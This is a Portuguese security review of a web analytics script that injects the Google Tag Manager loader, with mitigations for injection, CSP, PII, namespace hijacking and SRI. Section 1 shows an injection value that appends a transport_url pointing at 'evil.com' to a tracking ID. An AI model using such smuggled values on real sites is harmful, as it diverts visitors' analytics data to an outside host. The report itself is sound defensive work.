# Relatório de Análise de Segurança: centralized-web-analytics

Este documento detalha a análise de segurança realizada no script `analytics.js` e as medidas de mitigação implementadas.

## 1. Riscos de Injeção (XSS & Argument Injection)

### Análise
Como o script lê valores de atributos `data-*` no DOM, existe o risco de que um invasor, se conseguir manipular o HTML da página, insira valores maliciosos que alterem o comportamento do script.

*   **Ponto Crítico:** O atributo `data-ga-id` é usado diretamente na construção da URL do script do Google Tag Manager.
*   **Ameaça:** Um valor como `G-12345&transport_url=https://evil.com` poderia redirecionar os dados de analytics para um servidor de terceiros.

### Medida de Mitigação (Implementada)
Foi adicionada uma validação via Expressão Regular para o `gaId`:
```javascript
if (!gaId || !/^[A-Z0-9-]+$/i.test(gaId)) {
  console.error('[Analytics] ID inválido ou ausente.');
  return;
}
```
Isso garante que apenas caracteres seguros (alfanuméricos e hífens) sejam aceitos, impedindo a injeção de parâmetros de query ou caminhos de URL.

---

## 2. Content Security Policy (CSP)

### Análise
O script injeta dinamicamente uma nova tag `<script>` apontando para `www.googletagmanager.com`. Em ambientes com políticas de segurança de conteúdo rigorosas, isso será bloqueado a menos que explicitamente permitido.

### Recomendação
Os usuários devem atualizar seus headers CSP para permitir os domínios do Google. Adicionamos uma seção no `README.md` com as diretivas necessárias.

---

## 3. Exposição de Dados Sensíveis (PII)

### Análise
A função `window.track(eventName, params)` permite o envio de qualquer objeto JSON. Desenvolvedores podem acidentalmente enviar e-mails, nomes ou tokens no objeto `params`.

### Recomendação
Incluímos um aviso de "Boas Práticas" no `README.md` desencorajando o envio de PII (Personally Identifiable Information).

---

## 4. Manipulação do Namespace Global

### Análise
O script define funções no objeto `window` (`window.track`, `window.gtag`). Se um script malicioso for carregado *antes* do `analytics.js`, ele pode "sequestrar" essas funções para interceptar dados.

### Mitigação
O uso de um IIFE (Immediately Invoked Function Expression) protege as variáveis internas, mas a exposição global é necessária para a funcionalidade. O script usa `window.__GA_INITIALIZED__` para evitar múltiplas execuções, o que é uma prática recomendada de idempotência.

---

## 5. Subresource Integrity (SRI)

### Análise
Ao servir o arquivo `analytics.js` via CDN, se a CDN for comprometida, o script pode ser alterado.

### Recomendação
Embora o script seja servido pelo próprio usuário (centralizado), recomendamos o uso de SRI na tag de inclusão se o arquivo for estático.

---

## Conclusão
O script foi hardened contra as ameaças mais comuns de injeção em ambiente browser. A segurança final depende também da correta configuração de CSP e da higiene de dados por parte dos desenvolvedores que utilizam a função `window.track`.
